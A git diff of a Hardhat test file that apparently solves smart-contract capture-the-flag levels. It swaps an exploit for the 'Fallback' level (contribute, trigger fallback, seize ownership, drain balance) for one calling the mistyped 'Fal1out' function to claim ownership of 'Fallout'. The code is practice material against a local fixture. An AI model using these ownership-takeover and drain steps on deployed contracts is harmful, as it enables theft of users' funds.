@@ -3,7 +3,7 @@ import { expect } from "chai";
 import { parseEther } from "ethers/lib/utils";
 import { ethers } from "hardhat";
 
-const contractName = "Fallback";
+const contractName = "Fallout";
 
 async function deployFixture() {
   const [deployer, attacker] = await ethers.getSigners();
@@ -35,38 +35,17 @@ describe(contractName, function () {
   });
 
   describe("Attack", function () {
-    it("should claim ownership and reduce balance to 0", async function () {
-      const { contract, provider, attacker, deployer } = await loadFixture(
-        deployFixture
-      );
-      // contribute to Fallback by calling contribute
-      const attackerContribution = parseEther("0.0005");
-      const contributeData = await contract.populateTransaction.contribute();
+    it("claim ownership of the contract below to complete this level", async function () {
+      const { contract, attacker } = await loadFixture(deployFixture);
+      // call the Fal1out function
+      const fal1outData = await contract.populateTransaction.Fal1out();
       await attacker.sendTransaction({
         to: contract.address,
-        value: attackerContribution,
-        data: contributeData.data,
+        data: fal1outData.data,
       });
-      // trigger fallback
-      await attacker.sendTransaction({
-        to: contract.address,
-        value: attackerContribution,
-      });
-      // check contract balance
-      let contractBalance = await provider.getBalance(contract.address);
-      expect(contractBalance).to.be.eql(attackerContribution.mul(2));
       // check attacker as owner
       const owner = await contract.owner();
       expect(owner).to.be.eql(attacker.address);
-      // withdraw balance
-      const withdrawData = await contract.populateTransaction.withdraw();
-      await attacker.sendTransaction({
-        to: contract.address,
-        data: withdrawData.data,
-      });
-      // check contract balance is 0
-      contractBalance = await provider.getBalance(contract.address);
-      expect(contractBalance.toString()).to.be.eql("0");
     });
   });
 });
